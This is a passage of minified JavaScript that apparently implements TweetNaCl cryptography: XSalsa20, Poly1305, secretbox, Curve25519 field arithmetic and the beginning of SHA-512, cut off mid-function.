            (t[23] = (_ >>> 24) & 255),
            (t[24] = (T >>> 0) & 255),
            (t[25] = (T >>> 8) & 255),
            (t[26] = (T >>> 16) & 255),
            (t[27] = (T >>> 24) & 255),
            (t[28] = (S >>> 0) & 255),
            (t[29] = (S >>> 8) & 255),
            (t[30] = (S >>> 16) & 255),
            (t[31] = (S >>> 24) & 255));
        }
        function B(t, e, r, n) {
          y(t, e, r, n);
        }
        function A(t, e, r, n) {
          m(t, e, r, n);
        }
        var F = new Uint8Array([
          101, 120, 112, 97, 110, 100, 32, 51, 50, 45, 98, 121, 116, 101, 32,
          107,
        ]);
        function E(t, e, r, n, i, s, o) {
          var a,
            l,
            h = new Uint8Array(16),
            c = new Uint8Array(64);
          for (l = 0; l < 16; l++) h[l] = 0;
          for (l = 0; l < 8; l++) h[l] = s[l];
          while (i >= 64) {
            for (B(c, h, o, F), l = 0; l < 64; l++) t[e + l] = r[n + l] ^ c[l];
            for (a = 1, l = 8; l < 16; l++)
              ((a = (a + (255 & h[l])) | 0), (h[l] = 255 & a), (a >>>= 8));
            ((i -= 64), (e += 64), (n += 64));
          }
          if (i > 0)
            for (B(c, h, o, F), l = 0; l < i; l++) t[e + l] = r[n + l] ^ c[l];
          return 0;
        }
        function b(t, e, r, n, i) {
          var s,
            o,
            a = new Uint8Array(16),
            l = new Uint8Array(64);
          for (o = 0; o < 16; o++) a[o] = 0;
          for (o = 0; o < 8; o++) a[o] = n[o];
          while (r >= 64) {
            for (B(l, a, i, F), o = 0; o < 64; o++) t[e + o] = l[o];
            for (s = 1, o = 8; o < 16; o++)
              ((s = (s + (255 & a[o])) | 0), (a[o] = 255 & s), (s >>>= 8));
            ((r -= 64), (e += 64));
          }
          if (r > 0) for (B(l, a, i, F), o = 0; o < r; o++) t[e + o] = l[o];
          return 0;
        }
        function v(t, e, r, n, i) {
          var s = new Uint8Array(32);
          A(s, n, i, F);
          for (var o = new Uint8Array(8), a = 0; a < 8; a++) o[a] = n[a + 16];
          return b(t, e, r, o, s);
        }
        function D(t, e, r, n, i, s, o) {
          var a = new Uint8Array(32);
          A(a, s, o, F);
          for (var l = new Uint8Array(8), h = 0; h < 8; h++) l[h] = s[h + 16];
          return E(t, e, r, n, i, l, a);
        }
        var M = function (t) {
          var e, r, n, i, s, o, a, l;
          ((this.buffer = new Uint8Array(16)),
            (this.r = new Uint16Array(10)),
            (this.h = new Uint16Array(10)),
            (this.pad = new Uint16Array(8)),
            (this.leftover = 0),
            (this.fin = 0),
            (e = (255 & t[0]) | ((255 & t[1]) << 8)),
            (this.r[0] = 8191 & e),
            (r = (255 & t[2]) | ((255 & t[3]) << 8)),
            (this.r[1] = 8191 & ((e >>> 13) | (r << 3))),
            (n = (255 & t[4]) | ((255 & t[5]) << 8)),
            (this.r[2] = 7939 & ((r >>> 10) | (n << 6))),
            (i = (255 & t[6]) | ((255 & t[7]) << 8)),
            (this.r[3] = 8191 & ((n >>> 7) | (i << 9))),
            (s = (255 & t[8]) | ((255 & t[9]) << 8)),
            (this.r[4] = 255 & ((i >>> 4) | (s << 12))),
            (this.r[5] = (s >>> 1) & 8190),
            (o = (255 & t[10]) | ((255 & t[11]) << 8)),
            (this.r[6] = 8191 & ((s >>> 14) | (o << 2))),
            (a = (255 & t[12]) | ((255 & t[13]) << 8)),
            (this.r[7] = 8065 & ((o >>> 11) | (a << 5))),
            (l = (255 & t[14]) | ((255 & t[15]) << 8)),
            (this.r[8] = 8191 & ((a >>> 8) | (l << 8))),
            (this.r[9] = (l >>> 5) & 127),
            (this.pad[0] = (255 & t[16]) | ((255 & t[17]) << 8)),
            (this.pad[1] = (255 & t[18]) | ((255 & t[19]) << 8)),
            (this.pad[2] = (255 & t[20]) | ((255 & t[21]) << 8)),
            (this.pad[3] = (255 & t[22]) | ((255 & t[23]) << 8)),
            (this.pad[4] = (255 & t[24]) | ((255 & t[25]) << 8)),
            (this.pad[5] = (255 & t[26]) | ((255 & t[27]) << 8)),
            (this.pad[6] = (255 & t[28]) | ((255 & t[29]) << 8)),
            (this.pad[7] = (255 & t[30]) | ((255 & t[31]) << 8)));
        };
        function _(t, e, r, n, i, s) {
          var o = new M(s);
          return (o.update(r, n, i), o.finish(t, e), 0);
        }
        function T(t, e, r, n, i, s) {
          var o = new Uint8Array(16);
          return (_(o, 0, r, n, i, s), C(t, e, o, 0));
        }
        function S(t, e, r, n, i) {
          var s;
          if (r < 32) return -1;
          for (
            D(t, 0, e, 0, r, n, i), _(t, 16, t, 32, r - 32, t), s = 0;
            s < 16;
            s++
          )
            t[s] = 0;
          return 0;
        }
        function k(t, e, r, n, i) {
          var s,
            o = new Uint8Array(32);
          if (r < 32) return -1;
          if ((v(o, 0, 32, n, i), 0 !== T(e, 16, e, 32, r - 32, o))) return -1;
          for (D(t, 0, e, 0, r, n, i), s = 0; s < 32; s++) t[s] = 0;
          return 0;
        }
        function x(t, e) {
          var r;
          for (r = 0; r < 16; r++) t[r] = 0 | e[r];
        }
        function I(t) {
          var e,
            r,
            n = 1;
          for (e = 0; e < 16; e++)
            ((r = t[e] + n + 65535),
              (n = Math.floor(r / 65536)),
              (t[e] = r - 65536 * n));
          t[0] += n - 1 + 37 * (n - 1);
        }
        function U(t, e, r) {
          for (var n, i = ~(r - 1), s = 0; s < 16; s++)
            ((n = i & (t[s] ^ e[s])), (t[s] ^= n), (e[s] ^= n));
        }
        function R(t, r) {
          var n,
            i,
            s,
            o = e(),
            a = e();
          for (n = 0; n < 16; n++) a[n] = r[n];
          for (I(a), I(a), I(a), i = 0; i < 2; i++) {
            for (o[0] = a[0] - 65517, n = 1; n < 15; n++)
              ((o[n] = a[n] - 65535 - ((o[n - 1] >> 16) & 1)),
                (o[n - 1] &= 65535));
            ((o[15] = a[15] - 32767 - ((o[14] >> 16) & 1)),
              (s = (o[15] >> 16) & 1),
              (o[14] &= 65535),
              U(a, o, 1 - s));
          }
          for (n = 0; n < 16; n++)
            ((t[2 * n] = 255 & a[n]), (t[2 * n + 1] = a[n] >> 8));
        }
        function N(t, e) {
          var r = new Uint8Array(32),
            n = new Uint8Array(32);
          return (R(r, t), R(n, e), g(r, 0, n, 0));
        }
        function P(t) {
          var e = new Uint8Array(32);
          return (R(e, t), 1 & e[0]);
        }
        function O(t, e) {
          var r;
          for (r = 0; r < 16; r++) t[r] = e[2 * r] + (e[2 * r + 1] << 8);
          t[15] &= 32767;
        }
        function K(t, e, r) {
          for (var n = 0; n < 16; n++) t[n] = e[n] + r[n];
        }
        function W(t, e, r) {
          for (var n = 0; n < 16; n++) t[n] = e[n] - r[n];
        }
        function L(t, e, r) {
          var n,
            i,
            s = 0,
            o = 0,
            a = 0,
            l = 0,
            h = 0,
            c = 0,
            u = 0,
            d = 0,
            f = 0,
            p = 0,
            w = 0,
            C = 0,
            g = 0,
            y = 0,
            m = 0,
            B = 0,
            A = 0,
            F = 0,
            E = 0,
            b = 0,
            v = 0,
            D = 0,
            M = 0,
            _ = 0,
            T = 0,
            S = 0,
            k = 0,
            x = 0,
            I = 0,
            U = 0,
            R = 0,
            N = r[0],
            P = r[1],
            O = r[2],
            K = r[3],
            W = r[4],
            L = r[5],
            q = r[6],
            H = r[7],
            j = r[8],
            V = r[9],
            Q = r[10],
            J = r[11],
            G = r[12],
            z = r[13],
            Y = r[14],
            Z = r[15];
          ((n = e[0]),
            (s += n * N),
            (o += n * P),
            (a += n * O),
            (l += n * K),
            (h += n * W),
            (c += n * L),
            (u += n * q),
            (d += n * H),
            (f += n * j),
            (p += n * V),
            (w += n * Q),
            (C += n * J),
            (g += n * G),
            (y += n * z),
            (m += n * Y),
            (B += n * Z),
            (n = e[1]),
            (o += n * N),
            (a += n * P),
            (l += n * O),
            (h += n * K),
            (c += n * W),
            (u += n * L),
            (d += n * q),
            (f += n * H),
            (p += n * j),
            (w += n * V),
            (C += n * Q),
            (g += n * J),
            (y += n * G),
            (m += n * z),
            (B += n * Y),
            (A += n * Z),
            (n = e[2]),
            (a += n * N),
            (l += n * P),
            (h += n * O),
            (c += n * K),
            (u += n * W),
            (d += n * L),
            (f += n * q),
            (p += n * H),
            (w += n * j),
            (C += n * V),
            (g += n * Q),
            (y += n * J),
            (m += n * G),
            (B += n * z),
            (A += n * Y),
            (F += n * Z),
            (n = e[3]),
            (l += n * N),
            (h += n * P),
            (c += n * O),
            (u += n * K),
            (d += n * W),
            (f += n * L),
            (p += n * q),
            (w += n * H),
            (C += n * j),
            (g += n * V),
            (y += n * Q),
            (m += n * J),
            (B += n * G),
            (A += n * z),
            (F += n * Y),
            (E += n * Z),
            (n = e[4]),
            (h += n * N),
            (c += n * P),
            (u += n * O),
            (d += n * K),
            (f += n * W),
            (p += n * L),
            (w += n * q),
            (C += n * H),
            (g += n * j),
            (y += n * V),
            (m += n * Q),
            (B += n * J),
            (A += n * G),
            (F += n * z),
            (E += n * Y),
            (b += n * Z),
            (n = e[5]),
            (c += n * N),
            (u += n * P),
            (d += n * O),
            (f += n * K),
            (p += n * W),
            (w += n * L),
            (C += n * q),
            (g += n * H),
            (y += n * j),
            (m += n * V),
            (B += n * Q),
            (A += n * J),
            (F += n * G),
            (E += n * z),
            (b += n * Y),
            (v += n * Z),
            (n = e[6]),
            (u += n * N),
            (d += n * P),
            (f += n * O),
            (p += n * K),
            (w += n * W),
            (C += n * L),
            (g += n * q),
            (y += n * H),
            (m += n * j),
            (B += n * V),
            (A += n * Q),
            (F += n * J),
            (E += n * G),
            (b += n * z),
            (v += n * Y),
            (D += n * Z),
            (n = e[7]),
            (d += n * N),
            (f += n * P),
            (p += n * O),
            (w += n * K),
            (C += n * W),
            (g += n * L),
            (y += n * q),
            (m += n * H),
            (B += n * j),
            (A += n * V),
            (F += n * Q),
            (E += n * J),
            (b += n * G),
            (v += n * z),
            (D += n * Y),
            (M += n * Z),
            (n = e[8]),
            (f += n * N),
            (p += n * P),
            (w += n * O),
            (C += n * K),
            (g += n * W),
            (y += n * L),
            (m += n * q),
            (B += n * H),
            (A += n * j),
            (F += n * V),
            (E += n * Q),
            (b += n * J),
            (v += n * G),
            (D += n * z),
            (M += n * Y),
            (_ += n * Z),
            (n = e[9]),
            (p += n * N),
            (w += n * P),
            (C += n * O),
            (g += n * K),
            (y += n * W),
            (m += n * L),
            (B += n * q),
            (A += n * H),
            (F += n * j),
            (E += n * V),
            (b += n * Q),
            (v += n * J),
            (D += n * G),
            (M += n * z),
            (_ += n * Y),
            (T += n * Z),
            (n = e[10]),
            (w += n * N),
            (C += n * P),
            (g += n * O),
            (y += n * K),
            (m += n * W),
            (B += n * L),
            (A += n * q),
            (F += n * H),
            (E += n * j),
            (b += n * V),
            (v += n * Q),
            (D += n * J),
            (M += n * G),
            (_ += n * z),
            (T += n * Y),
            (S += n * Z),
            (n = e[11]),
            (C += n * N),
            (g += n * P),
            (y += n * O),
            (m += n * K),
            (B += n * W),
            (A += n * L),
            (F += n * q),
            (E += n * H),
            (b += n * j),
            (v += n * V),
            (D += n * Q),
            (M += n * J),
            (_ += n * G),
            (T += n * z),
            (S += n * Y),
            (k += n * Z),
            (n = e[12]),
            (g += n * N),
            (y += n * P),
            (m += n * O),
            (B += n * K),
            (A += n * W),
            (F += n * L),
            (E += n * q),
            (b += n * H),
            (v += n * j),
            (D += n * V),
            (M += n * Q),
            (_ += n * J),
            (T += n * G),
            (S += n * z),
            (k += n * Y),
            (x += n * Z),
            (n = e[13]),
            (y += n * N),
            (m += n * P),
            (B += n * O),
            (A += n * K),
            (F += n * W),
            (E += n * L),
            (b += n * q),
            (v += n * H),
            (D += n * j),
            (M += n * V),
            (_ += n * Q),
            (T += n * J),
            (S += n * G),
            (k += n * z),
            (x += n * Y),
            (I += n * Z),
            (n = e[14]),
            (m += n * N),
            (B += n * P),
            (A += n * O),
            (F += n * K),
            (E += n * W),
            (b += n * L),
            (v += n * q),
            (D += n * H),
            (M += n * j),
            (_ += n * V),
            (T += n * Q),
            (S += n * J),
            (k += n * G),
            (x += n * z),
            (I += n * Y),
            (U += n * Z),
            (n = e[15]),
            (B += n * N),
            (A += n * P),
            (F += n * O),
            (E += n * K),
            (b += n * W),
            (v += n * L),
            (D += n * q),
            (M += n * H),
            (_ += n * j),
            (T += n * V),
            (S += n * Q),
            (k += n * J),
            (x += n * G),
            (I += n * z),
            (U += n * Y),
            (R += n * Z),
            (s += 38 * A),
            (o += 38 * F),
            (a += 38 * E),
            (l += 38 * b),
            (h += 38 * v),
            (c += 38 * D),
            (u += 38 * M),
            (d += 38 * _),
            (f += 38 * T),
            (p += 38 * S),
            (w += 38 * k),
            (C += 38 * x),
            (g += 38 * I),
            (y += 38 * U),
            (m += 38 * R),
            (i = 1),
            (n = s + i + 65535),
            (i = Math.floor(n / 65536)),
            (s = n - 65536 * i),
            (n = o + i + 65535),
            (i = Math.floor(n / 65536)),
            (o = n - 65536 * i),
            (n = a + i + 65535),
            (i = Math.floor(n / 65536)),
            (a = n - 65536 * i),
            (n = l + i + 65535),
            (i = Math.floor(n / 65536)),
            (l = n - 65536 * i),
            (n = h + i + 65535),
            (i = Math.floor(n / 65536)),
            (h = n - 65536 * i),
            (n = c + i + 65535),
            (i = Math.floor(n / 65536)),
            (c = n - 65536 * i),
            (n = u + i + 65535),
            (i = Math.floor(n / 65536)),
            (u = n - 65536 * i),
            (n = d + i + 65535),
            (i = Math.floor(n / 65536)),
            (d = n - 65536 * i),
            (n = f + i + 65535),
            (i = Math.floor(n / 65536)),
            (f = n - 65536 * i),
            (n = p + i + 65535),
            (i = Math.floor(n / 65536)),
            (p = n - 65536 * i),
            (n = w + i + 65535),
            (i = Math.floor(n / 65536)),
            (w = n - 65536 * i),
            (n = C + i + 65535),
            (i = Math.floor(n / 65536)),
            (C = n - 65536 * i),
            (n = g + i + 65535),
            (i = Math.floor(n / 65536)),
            (g = n - 65536 * i),
            (n = y + i + 65535),
            (i = Math.floor(n / 65536)),
            (y = n - 65536 * i),
            (n = m + i + 65535),
            (i = Math.floor(n / 65536)),
            (m = n - 65536 * i),
            (n = B + i + 65535),
            (i = Math.floor(n / 65536)),
            (B = n - 65536 * i),
            (s += i - 1 + 37 * (i - 1)),
            (i = 1),
            (n = s + i + 65535),
            (i = Math.floor(n / 65536)),
            (s = n - 65536 * i),
            (n = o + i + 65535),
            (i = Math.floor(n / 65536)),
            (o = n - 65536 * i),
            (n = a + i + 65535),
            (i = Math.floor(n / 65536)),
            (a = n - 65536 * i),
            (n = l + i + 65535),
            (i = Math.floor(n / 65536)),
            (l = n - 65536 * i),
            (n = h + i + 65535),
            (i = Math.floor(n / 65536)),
            (h = n - 65536 * i),
            (n = c + i + 65535),
            (i = Math.floor(n / 65536)),
            (c = n - 65536 * i),
            (n = u + i + 65535),
            (i = Math.floor(n / 65536)),
            (u = n - 65536 * i),
            (n = d + i + 65535),
            (i = Math.floor(n / 65536)),
            (d = n - 65536 * i),
            (n = f + i + 65535),
            (i = Math.floor(n / 65536)),
            (f = n - 65536 * i),
            (n = p + i + 65535),
            (i = Math.floor(n / 65536)),
            (p = n - 65536 * i),
            (n = w + i + 65535),
            (i = Math.floor(n / 65536)),
            (w = n - 65536 * i),
            (n = C + i + 65535),
            (i = Math.floor(n / 65536)),
            (C = n - 65536 * i),
            (n = g + i + 65535),
            (i = Math.floor(n / 65536)),
            (g = n - 65536 * i),
            (n = y + i + 65535),
            (i = Math.floor(n / 65536)),
            (y = n - 65536 * i),
            (n = m + i + 65535),
            (i = Math.floor(n / 65536)),
            (m = n - 65536 * i),
            (n = B + i + 65535),
            (i = Math.floor(n / 65536)),
            (B = n - 65536 * i),
            (s += i - 1 + 37 * (i - 1)),
            (t[0] = s),
            (t[1] = o),
            (t[2] = a),
            (t[3] = l),
            (t[4] = h),
            (t[5] = c),
            (t[6] = u),
            (t[7] = d),
            (t[8] = f),
            (t[9] = p),
            (t[10] = w),
            (t[11] = C),
            (t[12] = g),
            (t[13] = y),
            (t[14] = m),
            (t[15] = B));
        }
        function q(t, e) {
          L(t, e, e);
        }
        function H(t, r) {
          var n,
            i = e();
          for (n = 0; n < 16; n++) i[n] = r[n];
          for (n = 253; n >= 0; n--)
            (q(i, i), 2 !== n && 4 !== n && L(i, i, r));
          for (n = 0; n < 16; n++) t[n] = i[n];
        }
        function j(t, r) {
          var n,
            i = e();
          for (n = 0; n < 16; n++) i[n] = r[n];
          for (n = 250; n >= 0; n--) (q(i, i), 1 !== n && L(i, i, r));
          for (n = 0; n < 16; n++) t[n] = i[n];
        }
        function V(t, r, n) {
          var i,
            s,
            o = new Uint8Array(32),
            a = new Float64Array(80),
            h = e(),
            c = e(),
            u = e(),
            d = e(),
            f = e(),
            p = e();
          for (s = 0; s < 31; s++) o[s] = r[s];
          for (
            o[31] = (127 & r[31]) | 64, o[0] &= 248, O(a, n), s = 0;
            s < 16;
            s++
          )
            ((c[s] = a[s]), (d[s] = h[s] = u[s] = 0));
          for (h[0] = d[0] = 1, s = 254; s >= 0; --s)
            ((i = (o[s >>> 3] >>> (7 & s)) & 1),
              U(h, c, i),
              U(u, d, i),
              K(f, h, u),
              W(h, h, u),
              K(u, c, d),
              W(c, c, d),
              q(d, f),
              q(p, h),
              L(h, u, h),
              L(u, c, f),
              K(f, h, u),
              W(h, h, u),
              q(c, h),
              W(u, d, p),
              L(h, u, l),
              K(h, h, d),
              L(u, u, h),
              L(h, d, p),
              L(d, c, a),
              q(c, f),
              U(h, c, i),
              U(u, d, i));
          for (s = 0; s < 16; s++)
            ((a[s + 16] = h[s]),
              (a[s + 32] = u[s]),
              (a[s + 48] = c[s]),
              (a[s + 64] = d[s]));
          var w = a.subarray(32),
            C = a.subarray(16);
          return (H(w, w), L(C, C, w), R(t, C), 0);
        }
        function Q(t, e) {
          return V(t, e, s);
        }
        function J(t, e) {
          return (n(e, 32), Q(t, e));
        }
        function G(t, e, r) {
          var n = new Uint8Array(32);
          return (V(n, r, e), A(t, i, n, F));
        }
        ((M.prototype.blocks = function (t, e, r) {
          var n,
            i,
            s,
            o,
            a,
            l,
            h,
            c,
            u,
            d,
            f,
            p,
            w,
            C,
            g,
            y,
            m,
            B,
            A,
            F = this.fin ? 0 : 2048,
            E = this.h[0],
            b = this.h[1],
            v = this.h[2],
            D = this.h[3],
            M = this.h[4],
            _ = this.h[5],
            T = this.h[6],
            S = this.h[7],
            k = this.h[8],
            x = this.h[9],
            I = this.r[0],
            U = this.r[1],
            R = this.r[2],
            N = this.r[3],
            P = this.r[4],
            O = this.r[5],
            K = this.r[6],
            W = this.r[7],
            L = this.r[8],
            q = this.r[9];
          while (r >= 16)
            ((n = (255 & t[e + 0]) | ((255 & t[e + 1]) << 8)),
              (E += 8191 & n),
              (i = (255 & t[e + 2]) | ((255 & t[e + 3]) << 8)),
              (b += 8191 & ((n >>> 13) | (i << 3))),
              (s = (255 & t[e + 4]) | ((255 & t[e + 5]) << 8)),
              (v += 8191 & ((i >>> 10) | (s << 6))),
              (o = (255 & t[e + 6]) | ((255 & t[e + 7]) << 8)),
              (D += 8191 & ((s >>> 7) | (o << 9))),
              (a = (255 & t[e + 8]) | ((255 & t[e + 9]) << 8)),
              (M += 8191 & ((o >>> 4) | (a << 12))),
              (_ += (a >>> 1) & 8191),
              (l = (255 & t[e + 10]) | ((255 & t[e + 11]) << 8)),
              (T += 8191 & ((a >>> 14) | (l << 2))),
              (h = (255 & t[e + 12]) | ((255 & t[e + 13]) << 8)),
              (S += 8191 & ((l >>> 11) | (h << 5))),
              (c = (255 & t[e + 14]) | ((255 & t[e + 15]) << 8)),
              (k += 8191 & ((h >>> 8) | (c << 8))),
              (x += (c >>> 5) | F),
              (u = 0),
              (d = u),
              (d += E * I),
              (d += b * (5 * q)),
              (d += v * (5 * L)),
              (d += D * (5 * W)),
              (d += M * (5 * K)),
              (u = d >>> 13),
              (d &= 8191),
              (d += _ * (5 * O)),
              (d += T * (5 * P)),
              (d += S * (5 * N)),
              (d += k * (5 * R)),
              (d += x * (5 * U)),
              (u += d >>> 13),
              (d &= 8191),
              (f = u),
              (f += E * U),
              (f += b * I),
              (f += v * (5 * q)),
              (f += D * (5 * L)),
              (f += M * (5 * W)),
              (u = f >>> 13),
              (f &= 8191),
              (f += _ * (5 * K)),
              (f += T * (5 * O)),
              (f += S * (5 * P)),
              (f += k * (5 * N)),
              (f += x * (5 * R)),
              (u += f >>> 13),
              (f &= 8191),
              (p = u),
              (p += E * R),
              (p += b * U),
              (p += v * I),
              (p += D * (5 * q)),
              (p += M * (5 * L)),
              (u = p >>> 13),
              (p &= 8191),
              (p += _ * (5 * W)),
              (p += T * (5 * K)),
              (p += S * (5 * O)),
              (p += k * (5 * P)),
              (p += x * (5 * N)),
              (u += p >>> 13),
              (p &= 8191),
              (w = u),
              (w += E * N),
              (w += b * R),
              (w += v * U),
              (w += D * I),
              (w += M * (5 * q)),
              (u = w >>> 13),
              (w &= 8191),
              (w += _ * (5 * L)),
              (w += T * (5 * W)),
              (w += S * (5 * K)),
              (w += k * (5 * O)),
              (w += x * (5 * P)),
              (u += w >>> 13),
              (w &= 8191),
              (C = u),
              (C += E * P),
              (C += b * N),
              (C += v * R),
              (C += D * U),
              (C += M * I),
              (u = C >>> 13),
              (C &= 8191),
              (C += _ * (5 * q)),
              (C += T * (5 * L)),
              (C += S * (5 * W)),
              (C += k * (5 * K)),
              (C += x * (5 * O)),
              (u += C >>> 13),
              (C &= 8191),
              (g = u),
              (g += E * O),
              (g += b * P),
              (g += v * N),
              (g += D * R),
              (g += M * U),
              (u = g >>> 13),
              (g &= 8191),
              (g += _ * I),
              (g += T * (5 * q)),
              (g += S * (5 * L)),
              (g += k * (5 * W)),
              (g += x * (5 * K)),
              (u += g >>> 13),
              (g &= 8191),
              (y = u),
              (y += E * K),
              (y += b * O),
              (y += v * P),
              (y += D * N),
              (y += M * R),
              (u = y >>> 13),
              (y &= 8191),
              (y += _ * U),
              (y += T * I),
              (y += S * (5 * q)),
              (y += k * (5 * L)),
              (y += x * (5 * W)),
              (u += y >>> 13),
              (y &= 8191),
              (m = u),
              (m += E * W),
              (m += b * K),
              (m += v * O),
              (m += D * P),
              (m += M * N),
              (u = m >>> 13),
              (m &= 8191),
              (m += _ * R),
              (m += T * U),
              (m += S * I),
              (m += k * (5 * q)),
              (m += x * (5 * L)),
              (u += m >>> 13),
              (m &= 8191),
              (B = u),
              (B += E * L),
              (B += b * W),
              (B += v * K),
              (B += D * O),
              (B += M * P),
              (u = B >>> 13),
              (B &= 8191),
              (B += _ * N),
              (B += T * R),
              (B += S * U),
              (B += k * I),
              (B += x * (5 * q)),
              (u += B >>> 13),
              (B &= 8191),
              (A = u),
              (A += E * q),
              (A += b * L),
              (A += v * W),
              (A += D * K),
              (A += M * O),
              (u = A >>> 13),
              (A &= 8191),
              (A += _ * P),
              (A += T * N),
              (A += S * R),
              (A += k * U),
              (A += x * I),
              (u += A >>> 13),
              (A &= 8191),
              (u = ((u << 2) + u) | 0),
              (u = (u + d) | 0),
              (d = 8191 & u),
              (u >>>= 13),
              (f += u),
              (E = d),
              (b = f),
              (v = p),
              (D = w),
              (M = C),
              (_ = g),
              (T = y),
              (S = m),
              (k = B),
              (x = A),
              (e += 16),
              (r -= 16));
          ((this.h[0] = E),
            (this.h[1] = b),
            (this.h[2] = v),
            (this.h[3] = D),
            (this.h[4] = M),
            (this.h[5] = _),
            (this.h[6] = T),
            (this.h[7] = S),
            (this.h[8] = k),
            (this.h[9] = x));
        }),
          (M.prototype.finish = function (t, e) {
            var r,
              n,
              i,
              s,
              o = new Uint16Array(10);
            if (this.leftover) {
              for (s = this.leftover, this.buffer[s++] = 1; s < 16; s++)
                this.buffer[s] = 0;
              ((this.fin = 1), this.blocks(this.buffer, 0, 16));
            }
            for (r = this.h[1] >>> 13, this.h[1] &= 8191, s = 2; s < 10; s++)
              ((this.h[s] += r), (r = this.h[s] >>> 13), (this.h[s] &= 8191));
            for (
              this.h[0] += 5 * r,
                r = this.h[0] >>> 13,
                this.h[0] &= 8191,
                this.h[1] += r,
                r = this.h[1] >>> 13,
                this.h[1] &= 8191,
                this.h[2] += r,
                o[0] = this.h[0] + 5,
                r = o[0] >>> 13,
                o[0] &= 8191,
                s = 1;
              s < 10;
              s++
            )
              ((o[s] = this.h[s] + r), (r = o[s] >>> 13), (o[s] &= 8191));
            for (o[9] -= 8192, n = (1 ^ r) - 1, s = 0; s < 10; s++) o[s] &= n;
            for (n = ~n, s = 0; s < 10; s++) this.h[s] = (this.h[s] & n) | o[s];
            for (
              this.h[0] = 65535 & (this.h[0] | (this.h[1] << 13)),
                this.h[1] = 65535 & ((this.h[1] >>> 3) | (this.h[2] << 10)),
                this.h[2] = 65535 & ((this.h[2] >>> 6) | (this.h[3] << 7)),
                this.h[3] = 65535 & ((this.h[3] >>> 9) | (this.h[4] << 4)),
                this.h[4] =
                  65535 &
                  ((this.h[4] >>> 12) | (this.h[5] << 1) | (this.h[6] << 14)),
                this.h[5] = 65535 & ((this.h[6] >>> 2) | (this.h[7] << 11)),
                this.h[6] = 65535 & ((this.h[7] >>> 5) | (this.h[8] << 8)),
                this.h[7] = 65535 & ((this.h[8] >>> 8) | (this.h[9] << 5)),
                i = this.h[0] + this.pad[0],
                this.h[0] = 65535 & i,
                s = 1;
              s < 8;
              s++
            )
              ((i = (((this.h[s] + this.pad[s]) | 0) + (i >>> 16)) | 0),
                (this.h[s] = 65535 & i));
            ((t[e + 0] = (this.h[0] >>> 0) & 255),
              (t[e + 1] = (this.h[0] >>> 8) & 255),
              (t[e + 2] = (this.h[1] >>> 0) & 255),
              (t[e + 3] = (this.h[1] >>> 8) & 255),
              (t[e + 4] = (this.h[2] >>> 0) & 255),
              (t[e + 5] = (this.h[2] >>> 8) & 255),
              (t[e + 6] = (this.h[3] >>> 0) & 255),
              (t[e + 7] = (this.h[3] >>> 8) & 255),
              (t[e + 8] = (this.h[4] >>> 0) & 255),
              (t[e + 9] = (this.h[4] >>> 8) & 255),
              (t[e + 10] = (this.h[5] >>> 0) & 255),
              (t[e + 11] = (this.h[5] >>> 8) & 255),
              (t[e + 12] = (this.h[6] >>> 0) & 255),
              (t[e + 13] = (this.h[6] >>> 8) & 255),
              (t[e + 14] = (this.h[7] >>> 0) & 255),
              (t[e + 15] = (this.h[7] >>> 8) & 255));
          }),
          (M.prototype.update = function (t, e, r) {
            var n, i;
            if (this.leftover) {
              for (i = 16 - this.leftover, i > r && (i = r), n = 0; n < i; n++)
                this.buffer[this.leftover + n] = t[e + n];
              if (
                ((r -= i), (e += i), (this.leftover += i), this.leftover < 16)
              )
                return;
              (this.blocks(this.buffer, 0, 16), (this.leftover = 0));
            }
            if (
              (r >= 16 &&
                ((i = r - (r % 16)), this.blocks(t, e, i), (e += i), (r -= i)),
              r)
            ) {
              for (n = 0; n < r; n++) this.buffer[this.leftover + n] = t[e + n];
              this.leftover += r;
            }
          }));
        var z = S,
          Y = k;
        function Z(t, e, r, n, i, s) {
          var o = new Uint8Array(32);
          return (G(o, i, s), z(t, e, r, n, o));
        }
        function X(t, e, r, n, i, s) {
          var o = new Uint8Array(32);
          return (G(o, i, s), Y(t, e, r, n, o));
        }
        var $ = [
          1116352408, 3609767458, 1899447441, 602891725, 3049323471, 3964484399,
          3921009573, 2173295548, 961987163, 4081628472, 1508970993, 3053834265,
          2453635748, 2937671579, 2870763221, 3664609560, 3624381080,
          2734883394, 310598401, 1164996542, 607225278, 1323610764, 1426881987,
          3590304994, 1925078388, 4068182383, 2162078206, 991336113, 2614888103,
          633803317, 3248222580, 3479774868, 3835390401, 2666613458, 4022224774,
          944711139, 264347078, 2341262773, 604807628, 2007800933, 770255983,
          1495990901, 1249150122, 1856431235, 1555081692, 3175218132,
          1996064986, 2198950837, 2554220882, 3999719339, 2821834349, 766784016,
          2952996808, 2566594879, 3210313671, 3203337956, 3336571891,
          1034457026, 3584528711, 2466948901, 113926993, 3758326383, 338241895,
          168717936, 666307205, 1188179964, 773529912, 1546045734, 1294757372,
          1522805485, 1396182291, 2643833823, 1695183700, 2343527390,
          1986661051, 1014477480, 2177026350, 1206759142, 2456956037, 344077627,
          2730485921, 1290863460, 2820302411, 3158454273, 3259730800,
          3505952657, 3345764771, 106217008, 3516065817, 3606008344, 3600352804,
          1432725776, 4094571909, 1467031594, 275423344, 851169720, 430227734,
          3100823752, 506948616, 1363258195, 659060556, 3750685593, 883997877,
          3785050280, 958139571, 3318307427, 1322822218, 3812723403, 1537002063,
          2003034995, 1747873779, 3602036899, 1955562222, 1575990012,
          2024104815, 1125592928, 2227730452, 2716904306, 2361852424, 442776044,
          2428436474, 593698344, 2756734187, 3733110249, 3204031479, 2999351573,
          3329325298, 3815920427, 3391569614, 3928383900, 3515267271, 566280711,
          3940187606, 3454069534, 4118630271, 4000239992, 116418474, 1914138554,
          174292421, 2731055270, 289380356, 3203993006, 460393269, 320620315,
          685471733, 587496836, 852142971, 1086792851, 1017036298, 365543100,
          1126000580, 2618297676, 1288033470, 3409855158, 1501505948,
          4234509866, 1607167915, 987167468, 1816402316, 1246189591,
        ];
        function tt(t, e, r, n) {
          var i,
            s,
            o,
            a,
            l,
            h,
            c,
            u,
            d,
            f,
            p,
            w,
            C,
            g,
            y,
            m,
            B,
            A,
            F,
            E,
            b,
            v,
            D,
            M,
            _,
            T,
            S = new Int32Array(16),
            k = new Int32Array(16),
            x = t[0],
            I = t[1],
            U = t[2],
            R = t[3],
            N = t[4],
            P = t[5],
            O = t[6],
            K = t[7],
            W = e[0],
            L = e[1],
            q = e[2],
            H = e[3],
            j = e[4],
            V = e[5],
            Q = e[6],
            J = e[7],
            G = 0;
          while (n >= 128) {
            for (F = 0; F < 16; F++)
              ((E = 8 * F + G),
                (S[F] =
                  (r[E + 0] << 24) |
